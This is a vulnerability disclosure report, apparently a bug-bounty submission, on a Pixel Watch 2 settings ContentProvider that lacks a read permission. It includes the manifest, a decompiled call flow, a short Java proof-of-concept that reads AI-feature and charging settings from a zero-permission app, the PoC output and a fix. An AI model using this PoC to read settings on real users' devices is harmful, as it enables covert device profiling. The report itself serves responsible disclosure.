# VRP Report #46: PixelWatchSettingsProvider Missing readPermission — Zero-Permission Device Settings Leak

## Vulnerability Summary
The PixelWatchSettingsProvider (`com.google.android.wearable.pixel.settings.provider`) runs as UID 1000 (system) and exports a ContentProvider with `android:writePermission="android.permission.WRITE_SECURE_SETTINGS"` but **no `android:readPermission`**. Any app on the device can read all Pixel Watch device settings via the `call("get", identifier, null)` method without any permission.

## Affected Component
- **Package**: `com.google.android.wearable.pixel.settings.provider`
- **APK**: `/system_ext/priv-app/PixelWatchSettingsProvider/PixelWatchSettingsProvider.apk`
- **Provider Authority**: `com.google.android.wearable.pixel.settings`
- **UID**: 1000 (system, `android:sharedUserId="android.uid.system"`)
- **Provider Config**: `exported="true"`, `visibleToInstantApps="true"`, `singleUser="true"`
- **Device**: Pixel Watch 2 (eos, CP2A.260603.001, June 2026 patches)

## Root Cause
In `AndroidManifest.xml`:
```xml
<provider android:authorities="com.google.android.wearable.pixel.settings"
    android:exported="true"
    android:initOrder="100"
    android:multiprocess="false"
    android:name="com.google.android.wearable.pixel.settings.provider.PixelWatchSettingsProvider"
    android:singleUser="true"
    android:visibleToInstantApps="true"
    android:writePermission="android.permission.WRITE_SECURE_SETTINGS"/>
```

The provider declares `writePermission="android.permission.WRITE_SECURE_SETTINGS"` but omits `readPermission`. The `call()` method dispatches to `SettingsHandler.handle()` which only calls `checkWritePermissions()` for PUT operations — GET operations have NO permission check.

### Code Flow (decompiled):
1. `call(method="get", name=identifier, extras=null)` → `AnonymousClass1.invokeSuspend()`
2. Checks if `name` is in `booleanSettingsAllowlistIdentifiers` or `intSettingsAllowlistIdentifiers`
3. Delegates to `SettingsHandler.handle("get", name, null)`
4. For "get": calls `getSetting(name)` → `storage.repositoryGet(name)` — **NO permission check**
5. For "put": calls `checkWritePermissions()` → `enforceCallingPermission(writePermission)` then `putSetting(name, extras)`

## Leaked Settings (10 total)

### Boolean Settings (9):
| Identifier | Name | Value | Privacy Impact |
|-----------|------|-------|----------------|
| 1001 | raise_to_talk | DISABLED | Assistant activation preference |
| 1002 | raise_to_talk_mediated | DISABLED | Mediated assistant mode |
| 1003 | raise_to_talk_supported | DISABLED | Device capability |
| 1004 | raise_to_talk_gemini_enabled | DISABLED | **Gemini AI usage status** |
| 1007 | raise_to_talk_indicator | NOT SET | UI indicator preference |
| 1008 | raise_to_talk_triggered | NOT SET | Trigger state |
| 2001 | adaptive_charging | ENABLED | Battery/charging behavior |
| 3001 | smart_reply_ai_enabled | DISABLED | **AI-powered smart replies** |
| 4004 | auto_bedtime_mode_supported | ENABLED | Sleep tracking capability |

### Int Settings (1):
| Identifier | Name | Value | Privacy Impact |
|-----------|------|-------|----------------|
| 1006 | raise_to_talk_sensitivity | NOT SET | Sensitivity level |

## Dynamic Proof
PoC running as **UID 10156** (zero-permission app), verified on 2026-09-10:
```
SETTING: raise_to_talk [1001] = DISABLED
SETTING: raise_to_talk_mediated [1002] = DISABLED
SETTING: raise_to_talk_supported [1003] = DISABLED
SETTING: raise_to_talk_gemini_enabled [1004] = DISABLED
SETTING: raise_to_talk_sensitivity [1006] = NOT SET
SETTING: raise_to_talk_indicator [1007] = NOT SET
SETTING: raise_to_talk_triggered [1008] = NOT SET
SETTING: adaptive_charging [2001] = ENABLED
SETTING: smart_reply_ai_enabled [3001] = DISABLED
SETTING: auto_bedtime_mode_supported [4004] = ENABLED

Settings read: 10/10
```

## Attack Code
```java
ContentResolver cr = getContentResolver();
Bundle result = cr.call(
    Uri.parse("content://com.google.android.wearable.pixel.settings"),
    "get", "1004", null);  // raise_to_talk_gemini_enabled
int value = result.getInt("value");  // 0=disabled, 1=enabled
```

## Impact
- **Confidentiality**: MEDIUM
  - Reveals whether user has Gemini AI enabled on their watch
  - Reveals AI smart reply usage preference
  - Reveals adaptive charging configuration
  - Reveals bedtime mode / sleep tracking capability
  - Enables fingerprinting of device AI/ML feature adoption
  - Combined with VRP #45 data, enables comprehensive device profiling
- **Integrity**: NONE — writes properly protected by WRITE_SECURE_SETTINGS
- **Availability**: NONE

## Relationship to VRP #45
This is the **same vulnerability pattern** (missing readPermission on system UID provider) in a different component:
- **VRP #45**: Wearable SettingsProvider — app enumeration + notification channels
- **VRP #46**: PixelWatch SettingsProvider — AI/ML feature settings

Both share the root cause: `writePermission` set, `readPermission` omitted, provider running as system UID.

## Recommended Fix
Add `android:readPermission` to the provider:
```xml
<provider android:authorities="com.google.android.wearable.pixel.settings"
    android:exported="true"
    android:readPermission="android.permission.READ_SECURE_SETTINGS"
    android:writePermission="android.permission.WRITE_SECURE_SETTINGS"
    android:name="...PixelWatchSettingsProvider"/>
```

Or add explicit caller permission checks in the `call()` method for GET operations.

## PoC Files
- `poc_app/src/com/vrp/poc/PixelWatchSettingsLeakActivity.java`
- `dynamic_evidence/pixelwatch_settings_provider_leak.log` (37 lines)
